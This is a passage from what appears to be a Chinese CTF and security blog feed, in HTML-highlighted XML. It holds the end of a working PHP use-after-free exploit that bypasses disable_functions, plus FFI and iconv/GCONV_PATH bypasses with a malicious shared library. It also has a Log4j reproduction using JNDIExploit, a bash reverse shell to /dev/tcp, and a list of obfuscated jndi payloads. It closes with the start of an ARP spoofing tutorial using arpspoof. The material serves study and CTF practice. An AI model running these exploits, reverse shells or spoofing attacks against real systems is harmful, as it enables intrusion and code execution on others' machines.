class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;constant&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br>                <span class="hljs-comment"># &#x27;bin2hex&#x27; constant check</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123; <span class="hljs-comment"># ELF header</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = leak(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = leak(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123; <span class="hljs-comment"># system</span><br>                <span class="hljs-keyword">return</span> leak(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-comment"># str_shuffle prevents opcache string interning</span><br>        <span class="hljs-variable">$arg</span> = str_shuffle(str_repeat(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> Vuln();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(stristr(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <span class="hljs-comment"># increase this value if UAF fails</span><br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = str_shuffle(str_repeat(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>));<br><br>    trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> Helper;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># leaks</span><br>    <span class="hljs-variable">$closure_handlers</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    <span class="hljs-comment"># fake value</span><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    <span class="hljs-comment"># fake reference</span><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = leak(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = get_binary_base(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = parse_elf(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = get_basic_funcs(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = get_system(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment"># fake closure object</span><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, leak(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    <span class="hljs-comment"># pwn</span><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <span class="hljs-comment"># internal func type</span><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <span class="hljs-comment"># internal func handler</span><br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="FFI拓展"><a href="#FFI拓展" class="headerlink" title="FFI拓展"></a>FFI拓展</h2><p>使用条件：</p><ul><li>PHP &gt;&#x3D; 7.4</li><li>开启了 FFI 扩展且 ffi.enable&#x3D;true</li></ul><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-string">&quot;tac /flag &gt; /tmp/123&quot;</span>);<br><span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/tmp/123&quot;</span>);<br>@unlink(<span class="hljs-string">&quot;/tmp/123&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>rce的技巧了算 ，ctfshow也有类似的题目</p><h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h2><p>使用条件：</p><ul><li><code>putenv</code></li><li><code>iconv</code></li><li>存在可写的目录, 需要上传 <code>.so</code> 文件</li></ul><p>php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()。</p><p>php的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中。</p><p>iconv_open函数的执行过程：</p><ol><li>iconv_open函数首先会找到系统提供的gconv-modules文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置。</li><li>然后再<strong>根据gconv-modules文件的指示</strong>去链接参数对应的.so文件。</li><li>之后会调用.so文件中的gconv()与gonv_init()函数。</li><li>然后就是一些与本漏洞利用无关的步骤。</li></ol><p><strong>Exploit</strong></p><p>编写 <code>gconv-modules</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">module  HACK<span class="hljs-regexp">//</span>    INTERNAL    ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>tmp/hack    <span class="hljs-number">2</span><br>module  INTERNAL    HACK<span class="hljs-regexp">//</span>    ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>tmp/hack    <span class="hljs-number">2</span><br><span class="hljs-regexp">//</span>注意 前面大写 后面 小写 内容自定义<br></code></pre></td></tr></table></figure><p>生成恶意so文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">gconv</span><span class="hljs-params">()</span> </span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">gconv_init</span><span class="hljs-params">()</span> </span>&#123;<br>  system(<span class="hljs-string">&quot;/readflag &gt; /tmp/flag&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc hack.c -o hack.so -shared -fPIC<br></code></pre></td></tr></table></figure><p>编写 1.php 上传到web目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    putenv(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);<br>    iconv(<span class="hljs-string">&quot;hack&quot;</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>之后访问 1.php 如果不行就再传一下hack.so上去</p><p>当然插件自带exp</p><hr><p>后面内容直接做知识库，不cp了</p><h2 id="利用Windows组件COM绕过"><a href="#利用Windows组件COM绕过" class="headerlink" title="利用Windows组件COM绕过"></a>利用Windows组件COM绕过</h2><p><a href="https://xz.aliyun.com/t/10057#toc-3">https://xz.aliyun.com/t/10057#toc-3</a></p><h2 id="利用imap-open-绕过"><a href="#利用imap-open-绕过" class="headerlink" title="利用imap_open()绕过"></a>利用imap_open()绕过</h2><p>使用条件：</p><ol><li>com.allow_dcom &#x3D; true</li><li>extension&#x3D;php_com_dotnet.dll</li><li>php&gt;5.4</li></ol><p><a href="https://xz.aliyun.com/t/10057#toc-9">https://xz.aliyun.com/t/10057#toc-9</a></p><h2 id="利用Pcntl组件"><a href="#利用Pcntl组件" class="headerlink" title="利用Pcntl组件"></a>利用Pcntl组件</h2><p><a href="https://xz.aliyun.com/t/10057#toc-10">https://xz.aliyun.com/t/10057#toc-10</a></p><h2 id="利用ImageMagick-漏洞绕过-CVE-2016–3714"><a href="#利用ImageMagick-漏洞绕过-CVE-2016–3714" class="headerlink" title="利用ImageMagick 漏洞绕过(CVE-2016–3714)"></a>利用ImageMagick 漏洞绕过(CVE-2016–3714)</h2><p><a href="https://xz.aliyun.com/t/10057#toc-11">https://xz.aliyun.com/t/10057#toc-11</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j漏洞学习</title>
    <link href="/2022/04/12/Log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/04/12/Log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h2><p>几个概念：</p><p>​    <strong>RMI</strong>：Java RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样</p><p>​    <strong>JNDI</strong>：JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）</p><p>​    <strong>Naming Service</strong></p><p>​    命名服务是将名称与值相关联的实体，称为”绑定”。它提供了一种使用”find”或”search”操作来根据名称查找对象的便捷方式。 就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。例如RMI Registry就是使用的Naming Service。</p><p>​    <strong>Directory Service</strong></p><p>​    是一种特殊的Naming Service，它允许存储和搜索”目录对象”，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。下面说到的LDAP就是目录服务。</p><p>​    <strong>LDAP</strong>：LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）</p><p>​    <strong>Log4j</strong>：我的另一篇文章里有简单提到 简单来说就是 日志系统的功能模块 <a href="https://d3n13d.github.io/2022/03/09/Java-Security/#Log4j">demo导航</a></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204121858835.png" alt="image-20220412185824711"></p><center>Log4j攻击原理</center><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>来源：ctfshow-Log4j复现</p><p><strong>检测</strong></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122323327.png" alt="image-20220412232345272"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122324319.png" alt="image-20220412232408274"></p><p>dnslog这边有记录就中</p><p><strong>漏洞利用</strong></p><p>JNDIExploit-1.2-SNAPSHOT.jar</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ip -p 8080<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122316909.png" alt="image-20220412231651851"></p><p>这边先启动程序，然后来构建shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/IP/</span>PORT <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>     <span class="hljs-comment">#我这里12345作为PORT 后面会用到</span><br><span class="hljs-comment"># =&gt; YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC8xMjM0NSAwPiYx   先base64</span><br><span class="hljs-comment"># =&gt; YmFzaCAtaSA%2BJiAvZGV2L3RjcC9JUC8xMjM0NSAwPiYx  然后urlencode</span><br></code></pre></td></tr></table></figure><p>随后构建payload</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/ip:1389/</span>TomcatBypass/Command/Base64/(上面的构建shell最后的结果)&#125;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122319102.png" alt="image-20220412231951047"></p><p>这年头复现个洞都这么不容易….</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202204122322202.png" alt="image-20220412232208123"></p><center><h3>我是笨比</h3></center><h2 id="收集到的一些Bypass手段"><a href="#收集到的一些Bypass手段" class="headerlink" title="收集到的一些Bypass手段"></a>收集到的一些Bypass手段</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">&#123;jndi:ldap://ip:1389/ badClassName&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;jndi:rmi://ip&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;::-j&#125;</span>ndi:rmi://ip/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;lower:jndi&#125;</span>:<span class="hljs-variable">$&#123;lower:rmi&#125;</span>://ip/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;upper:jndi&#125;</span>:<span class="hljs-variable">$&#123;upper:rmi&#125;</span>://ip/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;lower:<span class="hljs-variable">$&#123;lower:jndi&#125;</span>&#125;</span>:<span class="hljs-variable">$&#123;lower:rmi&#125;</span>://ip/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;lower:j&#125;</span><span class="hljs-variable">$&#123;lower:n&#125;</span><span class="hljs-variable">$&#123;lower:d&#125;</span>i:<span class="hljs-variable">$&#123;lower:rmi&#125;</span>://ip/Exploit&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;lower:j&#125;</span><span class="hljs-variable">$&#123;upper:n&#125;</span><span class="hljs-variable">$&#123;lower:d&#125;</span><span class="hljs-variable">$&#123;upper:i&#125;</span>:<span class="hljs-variable">$&#123;lower:r&#125;</span>m<span class="hljs-variable">$&#123;lower:i&#125;</span>&#125;://ip/Exploit&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;upper:j&#125;</span><span class="hljs-variable">$&#123;upper:n&#125;</span><span class="hljs-variable">$&#123;lower:d&#125;</span>i:<span class="hljs-variable">$&#123;upper:rmi&#125;</span>://ip/Exploit&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;upper:j&#125;</span><span class="hljs-variable">$&#123;upper:n&#125;</span><span class="hljs-variable">$&#123;upper:d&#125;</span><span class="hljs-variable">$&#123;upper:i&#125;</span>:<span class="hljs-variable">$&#123;lower:r&#125;</span>m<span class="hljs-variable">$&#123;lower:i&#125;</span>&#125;://ip/Exploit&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;::-j&#125;</span><span class="hljs-variable">$&#123;::-n&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-i&#125;</span>:<span class="hljs-variable">$&#123;::-r&#125;</span><span class="hljs-variable">$&#123;::-m&#125;</span><span class="hljs-variable">$&#123;::-i&#125;</span>://ip:1389/Exploit&#125;</span> <br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;::-j&#125;</span><span class="hljs-variable">$&#123;::-n&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-i&#125;</span>:<span class="hljs-variable">$&#123;::-l&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-a&#125;</span><span class="hljs-variable">$&#123;::-p&#125;</span>://<span class="hljs-variable">$&#123;hostName&#125;</span>.ip&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;upper::-j&#125;</span><span class="hljs-variable">$&#123;upper::-n&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;upper::-i&#125;</span>:<span class="hljs-variable">$&#123;upper::-l&#125;</span><span class="hljs-variable">$&#123;upper::-d&#125;</span><span class="hljs-variable">$&#123;upper::-a&#125;</span><span class="hljs-variable">$&#123;upper::-p&#125;</span>://<span class="hljs-variable">$&#123;hostName&#125;</span>.ip&#125;</span><br><span class="hljs-meta">$</span><span class="bash">&#123;<span class="hljs-variable">$&#123;::-j&#125;</span><span class="hljs-variable">$&#123;::-n&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-i&#125;</span>:<span class="hljs-variable">$&#123;::-l&#125;</span><span class="hljs-variable">$&#123;::-d&#125;</span><span class="hljs-variable">$&#123;::-a&#125;</span><span class="hljs-variable">$&#123;::-p&#125;</span>://<span class="hljs-variable">$&#123;hostName&#125;</span>.<span class="hljs-variable">$&#123;env:COMPUTERNAME&#125;</span>.<span class="hljs-variable">$&#123;env:USERDOMAIN&#125;</span>.<span class="hljs-variable">$&#123;env&#125;</span>.ip</span><br></code></pre></td></tr></table></figure><p><strong>参考链接</strong>：</p><p><a href="https://blog.csdn.net/hilaryfrank/article/details/121939902">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析(二)—漏洞原理</a></p><p><a href="https://blog.csdn.net/weixin_45677145/article/details/121980230?spm=1001.2101.3001.6650.9&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-9.pc_relevant_antiscanv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-9.pc_relevant_antiscanv2&utm_relevant_index=14">Log4j2 远程代码执行漏洞（cve-2021-44228）复现（反弹shell）</a></p><p><a href="https://blog.csdn.net/weixin_52829570/article/details/122496645">ctfshow Log4j复现wp</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp劫持与dns欺骗</title>
    <link href="/2022/03/25/arp%E5%8A%AB%E6%8C%81%E4%B8%8Edns%E6%AC%BA%E9%AA%97/"/>
    <url>/2022/03/25/arp%E5%8A%AB%E6%8C%81%E4%B8%8Edns%E6%AC%BA%E9%AA%97/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>学校作业之前笔记丢了重新搞一哈</p></blockquote><h2 id="arp劫持"><a href="#arp劫持" class="headerlink" title="arp劫持"></a>arp劫持</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>1.主机A要和主机C通信，主机A发出ARP包询问谁是192.168.1.3?请回复192.168.1.1。</li><li>2.这时主机B在疯狂的向主机A回复，我是192.168.1.3，我的地址是0A-11-22-33-44-02。</li><li>3.由于ARP协议不会验证回复者的身份，造成主机A错误的将192.168.1.3的MAC映射为0A-11-22-33-44-02。</li></ul><p>ARP欺骗分类</p><ul><li>1.主机欺骗：欺骗对象为主机。</li><li>2.网关欺骗：欺骗对象为网关，可以获得其他主机的进流量。</li></ul><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">arp-scan -l | awk &#x27;&#123;print $1&#125;&#x27; &gt; result.txt  #主机发现<br>nmap -O -iL result.txt   #确认机器 <br>route -n    #确认网关<br>arpspoof -i eth0 -t 192.168.145.133 -r 192.168.145.2<br>echo 1 &gt;/proc/sys/net/ipv4/ip_forward  #开启端口转发<br></code></pre></td></tr></table></figure><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251820533.png" alt="image-20220325182046394" style="zoom:88%;" /><center>确认目标机器</center><h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251827886.png" alt="image-20220325182759796"></p><center>展开攻击</center><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203251829090.png" alt="image-20220325182940949"></p><center>受害主机无法联网</center><p>这是因为攻击机没有开启端口转发的原因 未开启端口转发直接攻击较被发现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo 1 &gt;/proc/sys/net/ipv4/ip_forward  